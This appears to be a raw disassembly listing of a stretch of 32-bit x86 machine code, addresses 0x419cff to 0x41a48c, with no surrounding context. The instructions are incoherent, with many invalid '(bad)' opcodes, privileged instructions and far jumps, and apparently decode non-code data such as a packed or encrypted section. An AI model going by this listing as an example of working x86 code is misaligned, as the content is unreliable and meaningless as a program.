  419cff:	sub    BYTE PTR [edx-0x4d],bl
  419d02:	daa    
  419d03:	jg     0x419cbe
  419d05:	int3   
  419d06:	lds    edi,FWORD PTR [edx+0x141d6482]
  419d0c:	(bad)  
  419d0d:	imul   edx,DWORD PTR [ecx],0x3
  419d10:	mul    DWORD PTR [edx-0x48]
  419d13:	sbb    dl,BYTE PTR [ebx]
  419d15:	adc    BYTE PTR [edx+0xa],ch
  419d18:	fld    DWORD PTR [ecx]
  419d1a:	push   ebx
  419d1b:	xor    al,0xb1
  419d1d:	xlat   BYTE PTR ds:[ebx]
  419d1e:	sbb    dh,BYTE PTR [ecx+0x6c]
  419d21:	sub    DWORD PTR [edi],edi
  419d23:	push   edi
  419d24:	enter  0xb5,0xc2
  419d28:	gs int3 
  419d2a:	mov    esp,0x964278c8
  419d2f:	test   BYTE PTR ds:0xc3cde5cd,ah
  419d35:	push   cs
  419d36:	stos   BYTE PTR es:[edi],al
  419d37:	xor    ebp,esp
  419d39:	xlat   BYTE PTR ss:[ebx]
  419d3b:	sub    al,0x52
  419d3d:	jno    0x419d91
  419d3f:	lds    edi,FWORD PTR [ecx-0x64]
  419d42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d43:	lods   eax,DWORD PTR ds:[esi]
  419d44:	fdivp  st(2),st
  419d46:	ins    DWORD PTR es:[edi],dx
  419d47:	fisttp WORD PTR ds:[ebp-0x6b]
  419d4b:	xchg   esi,eax
  419d4c:	iret   
  419d4d:	xchg   ebx,eax
  419d4e:	retf   
  419d4f:	sub    eax,0x6770a964
  419d54:	stos   BYTE PTR es:[edi],al
  419d55:	outs   dx,DWORD PTR ds:[esi]
  419d56:	push   DWORD PTR [edx-0x5429b4bb]
  419d5c:	xor    bl,bl
  419d5e:	arpl   WORD PTR [edi-0x13a8ee79],bx
  419d64:	jmp    0x419d1a
  419d66:	sbb    esi,DWORD PTR [edi-0xcdf454b]
  419d6c:	ret    0x5196
  419d6f:	push   ebx
  419d70:	xchg   edi,eax
  419d71:	sub    eax,0x5c1bfef0
  419d76:	adc    eax,0x67ed3f0a
  419d7b:	pop    esp
  419d7c:	pop    edx
  419d7d:	inc    ebp
  419d7e:	nop
  419d7f:	xchg   esp,eax
  419d80:	mov    bl,bl
  419d82:	ss jne 0x419da8
  419d85:	(bad)  
  419d86:	stos   BYTE PTR es:[edi],al
  419d87:	retf   
  419d88:	loopne 0x419dd4
  419d8a:	xchg   esi,eax
  419d8b:	mov    bh,0xb0
  419d8d:	clc    
  419d8e:	icebp  
  419d8f:	push   eax
  419d90:	push   ebp
  419d91:	ja     0x419de5
  419d93:	mov    ecx,DWORD PTR [ebx+0x1180993a]
  419d99:	xor    cl,dl
  419d9b:	dec    edi
  419d9c:	xchg   edx,eax
  419d9d:	sub    dh,ah
  419d9f:	repnz xor eax,0x301bb514
  419da5:	cmp    BYTE PTR ds:0x7dd3a644,bh
  419dab:	and    edx,esi
  419dad:	and    eax,0x5700558d
  419db2:	dec    edi
  419db3:	mov    ch,0x58
  419db5:	mov    edi,0x21efa525
  419dba:	push   edx
  419dbb:	sub    ah,BYTE PTR [ebx+0x61c75c5b]
  419dc1:	push   edx
  419dc2:	sub    al,BYTE PTR [esi+0x48]
  419dc5:	cld    
  419dc6:	pop    ebp
  419dc7:	leave  
  419dc8:	(bad)  
  419dc9:	jmp    0xe017:0xf67cf05e
  419dd0:	dec    ebx
  419dd1:	sbb    al,0x82
  419dd3:	(bad)  
  419dd4:	sbb    eax,0xbc5fa502
  419dd9:	mov    ch,0x7b
  419ddb:	cdq    
  419ddc:	adc    BYTE PTR [edi+0x54f4eac5],dl
  419de2:	dec    esp
  419de3:	sbb    BYTE PTR [ebp+edx*4+0x644440cf],dl
  419dea:	push   es
  419deb:	popa   
  419dec:	call   0x40b3:0x2c0d
  419df2:	dec    esp
  419df3:	xlat   BYTE PTR ds:[ebx]
  419df4:	out    dx,eax
  419df5:	add    ch,dl
  419df7:	data16 mov WORD PTR [eax],es
  419dfa:	dec    ebx
  419dfb:	or     al,0xc4
  419dfd:	mov    al,ds:0x954ac869
  419e02:	loopne 0x419e13
  419e04:	icebp  
  419e05:	call   0xd7ae:0xbe462245
  419e0c:	int    0x6b
  419e0e:	bound  ebp,QWORD PTR [eax+0x19]
  419e11:	pushf  
  419e12:	dec    ebp
  419e13:	pop    edi
  419e14:	sbb    eax,0x464eb769
  419e19:	push   ebx
  419e1a:	js     0x419dd0
  419e1c:	jne    0x419da6
  419e1e:	dec    esp
  419e1f:	outs   dx,BYTE PTR ds:[esi]
  419e20:	fdivr  st(3),st
  419e22:	fbstp  TBYTE PTR [edx-0x11005d2b]
  419e28:	(bad)  
  419e29:	pop    eax
  419e2a:	pop    eax
  419e2b:	iret   
  419e2c:	inc    ebp
  419e2d:	imul   esi,DWORD PTR [ebx+eax*1],0xffffffe6
  419e31:	cwde   
  419e32:	stc    
  419e33:	(bad)  
  419e34:	scas   eax,DWORD PTR es:[edi]
  419e35:	mov    esp,0xd61961a7
  419e3a:	mov    al,cs:0x138e223d
  419e40:	xchg   esp,eax
  419e41:	pop    eax
  419e42:	sti    
  419e43:	lods   al,BYTE PTR es:[esi]
  419e45:	repz retf 
  419e47:	xchg   ebp,eax
  419e48:	sbb    DWORD PTR [edi+0x2b],esp
  419e4b:	cmp    al,BYTE PTR [si]
  419e4e:	mov    esi,0x2ba485d0
  419e53:	and    DWORD PTR [ecx+0x6a],esp
  419e56:	cwde   
  419e57:	test   BYTE PTR [si+0x40ed],ch
  419e5c:	cs add eax,0x1d90703a
  419e62:	imul   esp,DWORD PTR [ebx-0xd],0x3fee4649
  419e69:	int3   
  419e6a:	pop    ds
  419e6b:	test   eax,0x17a5a6b4
  419e70:	inc    ebx
  419e71:	push   esi
  419e72:	imul   ebx,DWORD PTR [edi],0xfd743699
  419e78:	xor    edx,eax
  419e7a:	(bad)  
  419e7b:	daa    
  419e7c:	mov    WORD PTR [ecx+0x2cf6e806],ds
  419e82:	imul   ebx,DWORD PTR [edi-0x3ebb71b0],0xffffffb3
  419e89:	jecxz  0x419e51
  419e8b:	js     0x419ece
  419e8d:	(bad)  
  419e8e:	pop    ss
  419e8f:	fs out dx,al
  419e91:	imul   ecx,DWORD PTR [edi+0x33],0xffffff93
  419e95:	push   eax
  419e96:	and    DWORD PTR [edx+0xe],esi
  419e99:	adc    al,0xd
  419e9b:	sbb    BYTE PTR [eax-0x5e96bc29],bh
  419ea1:	dec    ecx
  419ea2:	into   
  419ea3:	icebp  
  419ea4:	cwde   
  419ea5:	int3   
  419ea6:	mov    esi,0xf91679
  419eab:	pop    ds
  419eac:	test   BYTE PTR [edx-0x3603c545],bh
  419eb2:	imul   esi,eax,0xf955b4b7
  419eb8:	push   ebp
  419eb9:	xchg   ebp,eax
  419eba:	or     BYTE PTR [ecx],ah
  419ebc:	out    0x8c,eax
  419ebe:	popf   
  419ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ec0:	mov    al,BYTE PTR ds:0xba4566a6
  419ec6:	popf   
  419ec7:	(bad)  
  419ec8:	lods   al,BYTE PTR ds:[esi]
  419ec9:	pop    ecx
  419eca:	mov    al,ds:0x67f11bcf
  419ecf:	sbb    al,BYTE PTR [ebp-0x4257e21e]
  419ed5:	xchg   DWORD PTR [esi-0x3e],edi
  419ed8:	xlat   BYTE PTR ds:[ebx]
  419ed9:	cld    
  419eda:	jo     0x419f16
  419edc:	sub    ecx,DWORD PTR [edi]
  419ede:	loope  0x419eac
  419ee0:	xor    BYTE PTR [edx+0x2423bc23],bh
  419ee6:	pop    esi
  419ee7:	dec    eax
  419ee8:	xor    al,0x61
  419eea:	mov    ebp,DWORD PTR [eax+0x7a]
  419eed:	sub    esi,eax
  419eef:	add    esi,DWORD PTR [edx+0x22]
  419ef2:	aas    
  419ef3:	mov    cl,0x5e
  419ef5:	test   BYTE PTR [esi+esi*4+0x5daf102f],0x1
  419efd:	inc    ebx
  419efe:	mov    ebp,0x18e993cc
  419f03:	nop
  419f04:	and    al,0xea
  419f06:	nop
  419f07:	xchg   ecx,eax
  419f08:	nop
  419f09:	lods   eax,DWORD PTR ds:[esi]
  419f0a:	pop    esi
  419f0b:	ret    
  419f0c:	and    al,0xba
  419f0e:	xchg   edi,eax
  419f0f:	dec    eax
  419f10:	(bad)  
  419f11:	mov    gs,WORD PTR [eax+0x2924f45b]
  419f17:	ss jmp 0x58f7c09e
  419f1d:	fistp  QWORD PTR [ecx+eiz*4]
  419f20:	outs   dx,DWORD PTR ds:[esi]
  419f21:	sbb    DWORD PTR [ebx-0x55217791],esi
  419f27:	inc    esi
  419f28:	aaa    
  419f29:	inc    ebx
  419f2a:	jge    0x419ed4
  419f2c:	mov    ebp,0xb43d7b50
  419f31:	inc    ebx
  419f32:	test   al,0x2e
  419f34:	mov    al,ds:0xb42be7d0
  419f39:	xchg   ebx,eax
  419f3a:	mov    cl,0xf9
  419f3c:	les    edx,FWORD PTR [edx-0x21]
  419f3f:	mov    BYTE PTR [edi-0x315fb723],ah
  419f45:	cmovbe esi,DWORD PTR [esi-0x6a9be94d]
  419f4c:	stc    
  419f4d:	shr    ah,cl
  419f4f:	push   eax
  419f50:	xchg   edi,eax
  419f51:	mov    al,ds:0xf6162383
  419f56:	xchg   esi,eax
  419f57:	icebp  
  419f58:	push   eax
  419f59:	sub    DWORD PTR [edi+0x6e685dc0],eax
  419f5f:	pop    edx
  419f60:	rcr    BYTE PTR [esi],0x34
  419f63:	retf   0x22b8
  419f66:	push   ebx
  419f67:	call   0x6717:0x730485ed
  419f6e:	cmp    BYTE PTR [ebx],0xf6
  419f71:	fadd   st(2),st
  419f73:	hlt    
  419f74:	xlat   BYTE PTR ds:[ebx]
  419f75:	jae    0x419efa
  419f77:	ror    ah,cl
  419f79:	xor    esi,DWORD PTR [eax+eiz*8-0x45685a16]
  419f80:	gs in  al,0x23
  419f83:	xchg   ecx,eax
  419f84:	push   ebp
  419f85:	ds xchg edx,eax
  419f87:	xchg   ebp,eax
  419f88:	test   BYTE PTR [eax+0x7e],al
  419f8b:	sbb    dh,BYTE PTR [edi+eax*4-0x3e]
  419f8f:	and    cl,cl
  419f91:	jmp    0x256795cd
  419f96:	or     BYTE PTR [esi-0x1c25d7af],al
  419f9c:	push   ecx
  419f9d:	or     eax,0x70b67009
  419fa2:	imul   ebp,DWORD PTR [ebp-0x40],0xffffff9a
  419fa6:	aad    0x22
  419fa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fa9:	in     eax,dx
  419faa:	mov    cl,0xcf
  419fac:	cdq    
  419fad:	ffreep st(4)
  419faf:	test   eax,0xd71c5140
  419fb4:	jo     0x41a02a
  419fb6:	mov    al,0x1
  419fb8:	or     dh,BYTE PTR [edi]
  419fba:	jnp    0x419f96
  419fbc:	cmp    ch,BYTE PTR [ecx+0x79]
  419fbf:	in     eax,dx
  419fc0:	mov    al,ds:0xcb876e68
  419fc5:	das    
  419fc6:	jno    0x419fce
  419fc8:	inc    ecx
  419fc9:	aaa    
  419fca:	adc    BYTE PTR [ecx+eiz*4],dh
  419fcd:	std    
  419fce:	hlt    
  419fcf:	adc    bh,bl
  419fd1:	enter  0x53ac,0x3d
  419fd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fd6:	or     DWORD PTR [eax+0x2d],ecx
  419fd9:	popf   
  419fda:	mov    dl,0x4e
  419fdc:	dec    eax
  419fdd:	add    BYTE PTR [eax],ah
  419fdf:	imul   ebp,DWORD PTR [eax+0x2],0x20
  419fe3:	jnp    0x419f94
  419fe5:	or     eax,0xeb287943
  419fea:	ins    BYTE PTR es:[edi],dx
  419feb:	sbb    BYTE PTR [edx+0x5e],al
  419fee:	jno    0x419fc8
  419ff0:	hlt    
  419ff1:	outs   dx,DWORD PTR ds:[esi]
  419ff2:	sbb    BYTE PTR [edx],cl
  419ff4:	test   BYTE PTR [eax],al
  419ff6:	rol    BYTE PTR [eax-0x176812f6],cl
  419ffc:	and    BYTE PTR [esi+eiz*1],cl
  419fff:	mov    ebx,0x71f1ff90
  41a004:	xchg   BYTE PTR [esi+ebp*4],ch
  41a007:	cmp    ebp,DWORD PTR [eax]
  41a009:	jns    0x419fba
  41a00b:	jne    0x419ff8
  41a00d:	aas    
  41a00e:	pop    es
  41a00f:	pop    edx
  41a010:	mov    gs,WORD PTR [edi-0x2fc7bf17]
  41a016:	fidiv  WORD PTR [ecx+0x60]
  41a019:	mov    ecx,0xce08cbf7
  41a01e:	stos   DWORD PTR es:[edi],eax
  41a01f:	xor    cl,0xd3
  41a022:	fdivr  QWORD PTR [esi+0x3b6899a]
  41a028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a029:	mov    dh,0xa
  41a02b:	inc    esi
  41a02c:	add    esi,DWORD PTR [ecx]
  41a02e:	inc    esp
  41a02f:	push   ebx
  41a030:	ins    DWORD PTR es:[edi],dx
  41a031:	sub    eax,0x7ca856ee
  41a036:	pusha  
  41a037:	test   eax,0xcc4f4b54
  41a03c:	jbe    0x419fbe
  41a03e:	or     eax,0xef0f8bd2
  41a043:	popf   
  41a044:	sbb    BYTE PTR [edx],bh
  41a046:	and    al,0x1e
  41a048:	pop    edi
  41a049:	sub    BYTE PTR [eax+0x7146691],cl
  41a04f:	call   0x5c747fac
  41a054:	(bad)  
  41a055:	lods   al,BYTE PTR ds:[esi]
  41a056:	stos   BYTE PTR es:[edi],al
  41a057:	sub    esp,ebp
  41a059:	mov    edx,ebx
  41a05b:	rcl    DWORD PTR [eax+0x5b14561a],cl
  41a061:	adc    BYTE PTR [edx],bh
  41a063:	xlat   BYTE PTR ds:[ebx]
  41a064:	arpl   WORD PTR [ebp-0x49],di
  41a067:	jno    0x41a045
  41a069:	ret    0x1a35
  41a06c:	mov    ecx,esi
  41a06e:	and    al,0x31
  41a070:	and    DWORD PTR [edx+eax*2],edx
  41a073:	push   eax
  41a074:	(bad)  
  41a075:	sbb    eax,DWORD PTR [ebp+0x8]
  41a078:	lahf   
  41a079:	adc    DWORD PTR [ebx+0x2d],0xba124758
  41a080:	jnp    0x41a02b
  41a082:	ds stos BYTE PTR es:[edi],al
  41a084:	clc    
  41a085:	or     DWORD PTR [ebp-0x17968944],edx
  41a08b:	sub    DWORD PTR [esp+ecx*1],0x21
  41a08f:	pop    edx
  41a090:	(bad)  
  41a091:	repnz ins BYTE PTR es:[edi],dx
  41a093:	push   0xffffffcc
  41a095:	test   DWORD PTR gs:[edi+0x1b],ecx
  41a099:	xlat   BYTE PTR ds:[ebx]
  41a09a:	(bad)  
  41a09b:	jecxz  0x41a0b0
  41a09d:	sbb    ebx,DWORD PTR [esi-0x36a5120b]
  41a0a3:	and    al,0x5a
  41a0a5:	mov    bl,0xc1
  41a0a7:	xchg   ebp,eax
  41a0a8:	add    al,0x92
  41a0aa:	fst    QWORD PTR [edi]
  41a0ac:	cmp    BYTE PTR ds:0x2e85eef3,bl
  41a0b2:	aas    
  41a0b3:	dec    ebp
  41a0b4:	loopne 0x41a0be
  41a0b6:	mov    DWORD PTR [edx-0x55e7a966],edi
  41a0bc:	push   ecx
  41a0bd:	sbb    eax,0xb52b4af5
  41a0c2:	push   ebx
  41a0c3:	inc    ecx
  41a0c4:	adc    dl,al
  41a0c6:	aas    
  41a0c7:	je     0x41a0d5
  41a0c9:	pop    eax
  41a0ca:	xor    edx,0xffffffb2
  41a0cd:	sub    DWORD PTR [ebp+0x5ae68207],edi
  41a0d3:	push   cs
  41a0d4:	fsubr  QWORD PTR [ecx+0x24]
  41a0d7:	push   0xf9d0a908
  41a0dc:	loopne 0x41a0c5
  41a0de:	adc    al,0xe5
  41a0e0:	xchg   edx,eax
  41a0e1:	hlt    
  41a0e2:	pushf  
  41a0e3:	xor    ecx,DWORD PTR ds:0xedf5e5d6
  41a0e9:	jp     0x41a14e
  41a0eb:	mov    ebp,0x455fd559
  41a0f0:	mov    ecx,0x3cfafd65
  41a0f5:	mov    DWORD PTR [edi-0x74a5ba4b],edi
  41a0fb:	dec    esp
  41a0fc:	push   ecx
  41a0fd:	fcomi  st,st(4)
  41a0ff:	mov    dl,BYTE PTR [ecx+ebp*2]
  41a102:	push   es
  41a103:	mov    WORD PTR [edi],?
  41a105:	cmp    eax,0x7df09818
  41a10a:	add    al,0xaf
  41a10c:	push   edi
  41a10d:	cmp    dh,cl
  41a10f:	add    BYTE PTR [eax+edi*4-0x10],bl
  41a113:	jmp    0x90ee:0x3849e44d
  41a11a:	xor    al,0x35
  41a11c:	iret   
  41a11d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a11e:	jo     0x41a0f2
  41a120:	push   edx
  41a121:	sub    al,0x53
  41a123:	cmp    DWORD PTR [edi-0x53e0eaa4],0xee97a240
  41a12d:	nop
  41a12e:	scas   eax,DWORD PTR es:[edi]
  41a12f:	pop    ss
  41a130:	and    DWORD PTR [ecx],esi
  41a132:	pop    ebp
  41a133:	aad    0xc9
  41a135:	retf   0x353a
  41a138:	cmc    
  41a139:	push   0xfffffff6
  41a13b:	xchg   edx,eax
  41a13c:	push   cs
  41a13d:	or     eax,0x2397cd6d
  41a142:	push   esi
  41a143:	pmullw mm1,QWORD PTR [ebx*8-0x51f72332]
  41a14b:	rcr    al,1
  41a14d:	mov    esp,0x42d8fdf2
  41a153:	xor    BYTE PTR [ebp+0x8d00d90],cl
  41a159:	adc    al,0xc1
  41a15b:	daa    
  41a15c:	ret    
  41a15d:	ror    esi,1
  41a15f:	loop   0x41a17c
  41a161:	nop
  41a162:	pop    esi
  41a163:	call   0x10ac:0xefebc82e
  41a16a:	(bad)  
  41a16b:	repnz sub al,0x26
  41a16e:	data16 jg 0x41a11a
  41a171:	(bad)  
  41a172:	test   eax,0xba861d7b
  41a177:	pop    eax
  41a178:	test   DWORD PTR [ebp-0xbb2c5b6],0xe27ed97a
  41a182:	adc    DWORD PTR [eax-0x59],esi
  41a185:	add    WORD PTR [ebx],dx
  41a188:	adc    DWORD PTR [esi],ebx
  41a18a:	test   DWORD PTR ds:0xc12ddd04,esi
  41a190:	xor    eax,0x4317bdc8
  41a195:	fdivr  QWORD PTR [ebp+0x493e8769]
  41a19b:	jle    0x41a18b
  41a19d:	push   esi
  41a19e:	or     BYTE PTR [edi-0x7f0b494e],ch
  41a1a4:	ret    0x253c
  41a1a7:	fwait
  41a1a8:	sbb    eax,0x2aa8a6f
  41a1ad:	push   edx
  41a1ae:	fdivrp st(5),st
  41a1b0:	std    
  41a1b1:	out    0xc6,eax
  41a1b3:	push   ebx
  41a1b4:	mov    ch,0x48
  41a1b6:	cwde   
  41a1b7:	cwde   
  41a1b8:	lock test eax,0x7ea71b63
  41a1be:	add    ax,WORD PTR [edx]
  41a1c1:	(bad)
  41a1c5:	call   0xe80d:0xc25f154d
  41a1cc:	mov    edx,edx
  41a1ce:	xor    edx,DWORD PTR [esi]
  41a1d0:	hlt    
  41a1d1:	scas   eax,DWORD PTR es:[edi]
  41a1d2:	mov    cl,0x8e
  41a1d4:	mov    eax,0x82fbcad3
  41a1d9:	inc    eax
  41a1da:	dec    edi
  41a1db:	fimul  WORD PTR [esi-0x41]
  41a1de:	xlat   BYTE PTR ds:[ebx]
  41a1df:	cli    
  41a1e0:	sbb    BYTE PTR [ecx],dh
  41a1e2:	sbb    WORD PTR [edx],0xffd8
  41a1e6:	cmp    bl,BYTE PTR [ebx-0x1c0acae5]
  41a1ec:	dec    ebp
  41a1ed:	aaa    
  41a1ee:	and    DWORD PTR [esi-0x6e],ebx
  41a1f1:	loopne 0x41a1d9
  41a1f3:	mul    BYTE PTR [edi-0x48]
  41a1f6:	jmp    0xfc13:0xefe3f078
  41a1fd:	cmc    
  41a1fe:	sar    BYTE PTR [eax+esi*4],0x71
  41a202:	cmp    eax,0x8c694416
  41a207:	out    dx,eax
  41a208:	adc    ebp,DWORD PTR [ebx]
  41a20a:	mov    esi,0x1d751595
  41a20f:	jmp    0xc4f4:0xfa036748
  41a216:	xor    al,0xae
  41a218:	outs   dx,BYTE PTR ds:[esi]
  41a219:	psrlw  mm7,mm1
  41a21c:	enter  0xe8df,0xf3
  41a220:	dec    ebp
  41a221:	bound  esp,QWORD PTR fs:[eax-0x75]
  41a225:	popa   
  41a226:	cs pop eax
  41a228:	mov    bl,al
  41a22a:	push   ds
  41a22b:	xchg   esi,eax
  41a22c:	leave  
  41a22d:	lods   eax,DWORD PTR ds:[esi]
  41a22e:	loope  0x41a28e
  41a230:	lock add BYTE PTR [edx],ah
  41a233:	aas    
  41a234:	sbb    eax,0x1dd84133
  41a239:	ds das 
  41a23b:	xchg   BYTE PTR [edi+0x64e6a30e],cl
  41a241:	das    
  41a242:	or     ebp,DWORD PTR [ebp-0x39]
  41a245:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a246:	mov    BYTE PTR [ecx],al
  41a248:	mov    ch,0x90
  41a24a:	lahf   
  41a24b:	xor    al,0x8
  41a24d:	and    al,0x86
  41a24f:	(bad)  
  41a250:	dec    ebp
  41a251:	call   0xb884:0x1f553c2b
  41a258:	push   esp
  41a259:	aas    
  41a25a:	iret   
  41a25b:	xor    eax,DWORD PTR [edi+0x75a3bd92]
  41a261:	push   ds
  41a262:	gs cmp ah,ah
  41a265:	(bad)  
  41a266:	sbb    DWORD PTR [edx-0x9],edx
  41a269:	sbb    eax,0xc2e9e4db
  41a26e:	inc    ecx
  41a26f:	jnp    0x41a240
  41a271:	xor    al,bh
  41a273:	clc    
  41a274:	mov    ds:0x80fed4a1,eax
  41a279:	mov    dl,0x8b
  41a27b:	popa   
  41a27c:	mov    bh,0x71
  41a27e:	hlt    
  41a27f:	pop    esp
  41a280:	push   0xffffffda
  41a282:	and    BYTE PTR [edx+0xe8be7c8],0xc7
  41a289:	xchg   DWORD PTR [edi],edx
  41a28b:	xor    esi,DWORD PTR [eax-0xb908148]
  41a291:	mov    bh,ah
  41a293:	arpl   WORD PTR [ecx],cx
  41a295:	test   DWORD PTR [edx-0x69],esi
  41a298:	aas    
  41a299:	sbb    BYTE PTR [ebx-0x14235db1],dl
  41a29f:	imul   ebx,edi,0x28
  41a2a2:	dec    esp
  41a2a3:	sub    ecx,DWORD PTR [edx]
  41a2a5:	(bad)  
  41a2a6:	mov    al,0x12
  41a2a8:	sbb    bh,ah
  41a2aa:	pop    ds
  41a2ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2ac:	addr16 ds js 0x41a2a5
  41a2b0:	jp     0x41a281
  41a2b2:	inc    edx
  41a2b3:	add    BYTE PTR [edx+edi*1+0x6b43b134],bh
  41a2ba:	add    BYTE PTR [edx],dh
  41a2bc:	push   ds
  41a2bd:	cmp    BYTE PTR [esi-0x40],0x41
  41a2c1:	cmp    ebp,DWORD PTR [eax+ebx*1]
  41a2c4:	and    bh,BYTE PTR ds:0x7a5631d
  41a2ca:	fistp  QWORD PTR [edx-0x3a]
  41a2cd:	mov    eax,ds:0x290d946d
  41a2d2:	push   es
  41a2d3:	push   eax
  41a2d4:	stc    
  41a2d5:	jno    0x41a29d
  41a2d7:	ins    BYTE PTR es:[edi],dx
  41a2d8:	jmp    0x41a330
  41a2da:	or     BYTE PTR [edx],bl
  41a2dc:	nop
  41a2dd:	xchg   ecx,eax
  41a2de:	sbb    BYTE PTR [edx-0x3e21300f],0x83
  41a2e5:	(bad)
  41a2e8:	cmc    
  41a2e9:	sbb    DWORD PTR [ebx+edi*2+0x13],eax
  41a2ed:	mov    esp,0x410a9ca7
  41a2f2:	jno    0x41a2ba
  41a2f4:	inc    edi
  41a2f5:	icebp  
  41a2f6:	and    al,0x32
  41a2f8:	mov    edi,0xe9c95b7a
  41a2fd:	push   ecx
  41a2fe:	pop    es
  41a2ff:	pop    ecx
  41a300:	mov    bh,0xac
  41a302:	xchg   ebx,eax
  41a303:	mov    eax,ds:0x394ba754
  41a308:	out    dx,eax
  41a309:	sti    
  41a30a:	cmp    al,0x3f
  41a30c:	jb     0x41a2ff
  41a30e:	jge    0x41a33e
  41a310:	int3   
  41a311:	mov    edx,0x6036cbcf
  41a316:	sub    esi,DWORD PTR [esi+0x77]
  41a319:	mov    al,bl
  41a31b:	xor    ebp,edi
  41a31d:	sub    al,BYTE PTR [ecx-0x1260fa5f]
  41a323:	sub    BYTE PTR ds:0xe826131a,dl
  41a329:	push   cs
  41a32a:	push   ebx
  41a32b:	sub    al,0x3b
  41a32d:	ror    DWORD PTR [ecx+0x62],cl
  41a330:	es loopne 0x41a314
  41a333:	(bad)  
  41a334:	popf   
  41a335:	mov    ecx,0x134f7b24
  41a33a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a33b:	imul   ebp,DWORD PTR ds:0x70522bef,0xad3dc97c
  41a345:	lea    ebp,[esi+ebx*8-0xfdaacf3]
  41a34c:	addr16 pop ds
  41a34e:	xchg   esi,eax
  41a34f:	mov    esp,0x6fc36732
  41a354:	or     dh,0x6e
  41a357:	jle    0x41a361
  41a359:	pop    ss
  41a35a:	add    al,0x58
  41a35c:	add    ebx,0xc62b9d9a
  41a362:	loope  0x41a355
  41a364:	loope  0x41a3cc
  41a366:	sub    bh,bl
  41a368:	xor    al,0x71
  41a36a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a36b:	dec    ebp
  41a36c:	pop    ebx
  41a36d:	xchg   esp,eax
  41a36e:	cmp    dh,dl
  41a370:	nop
  41a371:	xor    ebx,0xa6f20bd0
  41a377:	stos   DWORD PTR es:[edi],eax
  41a378:	jmp    0x41a304
  41a37a:	jge    0x41a307
  41a37c:	cmp    ebx,DWORD PTR [esi]
  41a37e:	jp     0x41a337
  41a380:	push   cs
  41a381:	inc    edi
  41a382:	arpl   WORD PTR [esi-0x45],sp
  41a385:	aam    0xbd
  41a387:	stc    
  41a388:	add    al,0xaf
  41a38a:	xchg   ebp,eax
  41a38b:	lods   eax,DWORD PTR ds:[esi]
  41a38c:	pop    esp
  41a38d:	hlt    
  41a38e:	sahf   
  41a38f:	cmp    DWORD PTR [eax-0x42568c68],0xdec57440
  41a399:	add    ecx,0x98eb8fc0
  41a39f:	lods   al,BYTE PTR ds:[esi]
  41a3a0:	test   BYTE PTR [eax],dh
  41a3a2:	sbb    DWORD PTR [ebp+0x1],esp
  41a3a5:	aam    0xd0
  41a3a7:	pop    esi
  41a3a8:	push   edx
  41a3a9:	mov    BYTE PTR [ebp-0xae387e2],0x71
  41a3b0:	and    DWORD PTR ds:[ecx+edi*2],0xfb9528bf
  41a3b8:	inc    edx
  41a3b9:	(bad)  
  41a3ba:	in     eax,dx
  41a3bb:	fcomp  DWORD PTR [ebp-0x48]
  41a3be:	imul   edi,DWORD PTR [ebx-0x5ff5737a],0x992ff8f8
  41a3c8:	sbb    al,0xe9
  41a3ca:	shl    BYTE PTR ds:0x800b618f,1
  41a3d0:	ret    0xa06b
  41a3d3:	push   ss
  41a3d4:	pop    es
  41a3d5:	mov    esp,0x4f174fcd
  41a3da:	gs aam 0x15
  41a3dd:	adc    bl,bh
  41a3df:	mov    esp,0x267f99d6
  41a3e4:	inc    ebx
  41a3e5:	addr16 dec edx
  41a3e7:	pop    ecx
  41a3e8:	ficom  DWORD PTR [eax-0x7]
  41a3eb:	int3   
  41a3ec:	leave  
  41a3ed:	xrelease mov BYTE PTR [ebp-0x39a8710],dl
  41a3f4:	dec    esi
  41a3f5:	pop    ds
  41a3f6:	adc    ah,BYTE PTR [eax]
  41a3f8:	adc    al,0xb1
  41a3fa:	push   ss
  41a3fb:	out    dx,al
  41a3fc:	sub    DWORD PTR [ebp-0xf0063fa],ecx
  41a402:	fs pushf 
  41a404:	stos   DWORD PTR es:[edi],eax
  41a405:	jo     0x41a470
  41a407:	retf   0x57c
  41a40a:	cmp    eax,0xa0c96038
  41a40f:	mov    al,ds:0x7d1a50f6
  41a414:	in     al,dx
  41a415:	mov    WORD PTR [edi],gs
  41a417:	sbb    eax,0x9220d544
  41a41c:	popa   
  41a41d:	adc    al,0xa7
  41a41f:	ins    DWORD PTR es:[edi],dx
  41a420:	lods   al,BYTE PTR ds:[esi]
  41a421:	outs   dx,DWORD PTR ds:[esi]
  41a422:	cmp    DWORD PTR [edx+0x71b4ae84],eax
  41a428:	dec    ebx
  41a429:	xchg   BYTE PTR [eax+ecx*2+0x1d4a05cd],dh
  41a430:	jnp    0x41a41f
  41a432:	scas   eax,DWORD PTR es:[edi]
  41a433:	push   ebx
  41a434:	xchg   BYTE PTR [eax-0x1e],bl
  41a437:	nop
  41a438:	or     DWORD PTR [ebx-0x41],0xdb315aaf
  41a43f:	mov    eax,0xe57953a8
  41a444:	fs pusha 
  41a446:	push   ebp
  41a447:	jge    0x41a42a
  41a449:	scas   al,BYTE PTR es:[edi]
  41a44a:	in     eax,dx
  41a44b:	mov    al,ds:0xa4702160
  41a450:	lea    edi,[esi+edx*2-0x782a0ff4]
  41a457:	sti    
  41a458:	xchg   ebx,eax
  41a459:	xchg   esi,eax
  41a45a:	add    BYTE PTR fs:[edi+0x66],0x70
  41a45f:	dec    edi
  41a460:	push   ds
  41a461:	ret    0xcbf3
  41a464:	mov    esi,es
  41a466:	mov    gs,WORD PTR [edx-0x2a18481a]
  41a46c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a46d:	or     eax,0x1c39307c
  41a472:	popa   
  41a473:	std    
  41a474:	fs out 0xd4,al
  41a477:	ja     0x41a477
  41a479:	rcr    DWORD PTR [esi+0x24fab21e],cl
  41a47f:	ret    0xbc04
  41a482:	ret    
  41a483:	fild   WORD PTR [eax+edi*2+0x33]
  41a487:	ds xor al,0x80
  41a48a:	ror    eax,cl
  41a48c:	jae    0x41a429
